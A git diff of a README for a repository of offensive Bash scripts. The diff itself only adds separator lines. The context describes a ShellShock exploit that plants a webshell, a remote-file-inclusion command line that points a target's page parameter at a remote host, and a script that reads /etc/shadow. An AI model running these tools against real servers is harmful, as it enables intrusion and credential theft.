@@ -10,7 +10,7 @@ sudo chmod u+x *.sh
 $files=$(ls | grep ".sh")
 for f in $files; do cp "$f" /usr/local/bin/"${f%.sh}"; done
 ```
-
+---
 #### BASH EXPLOITS
 - __CVE-2014-6271.sh__ This exploit is used to execute commands on a remote server vulnerable to the CVE-2014-6271 ShellShock vulnerability. It creates a webshell at /var/www/html/simple.php and uses curl to simulate a shell like session. Currently only able to issue one word commads. I plan adding more functionality in the future.
 ![ShellShock CVE-2015-6271](https://raw.githubusercontent.com/tobor88/Bash/master/shellshock.png)
@@ -27,6 +27,7 @@ rfi-rce -f /var/www/html/evil.txt -u "http://target-ip/section.php?page=http://a
 ```
 ![rfi-rce.sh](https://raw.githubusercontent.com/tobor88/Bash/master/rfi-rce.png)
 
+---
 #### BASH COMMANDS
 - __readid.sh__ This is complete. (Disaplys the /etc/passwd, /etc/shadow, or /etc/group files into an easy to read format)
 
